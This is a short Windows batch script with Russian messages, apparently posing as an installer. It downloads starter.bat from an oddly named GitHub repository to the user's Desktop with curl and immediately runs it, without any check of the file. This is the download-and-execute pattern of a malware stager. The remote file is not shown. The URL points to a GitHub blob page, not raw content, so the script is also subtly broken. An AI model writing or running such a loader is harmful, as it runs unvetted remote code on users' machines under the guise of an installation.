@echo off
chcp 65001 >nul
set "DesktopPath=%USERPROFILE%\Desktop"

echo Подготовка к установке...
:: Используем curl для скачивания файла (встроен в Windows 10/11)
curl -L -o "%DesktopPath%\starter.bat" "https://github.com/rid853512-dotcom/legendary-garbanzo/blob/main/FNLS/starter.bat"

if exist "%DesktopPath%\starter.bat" (
    echo Запуск установщика...
    call "%DesktopPath%\starter.bat"
) else (
    echo Ошибка: Не удалось скачать файл с сервера.
    pause
)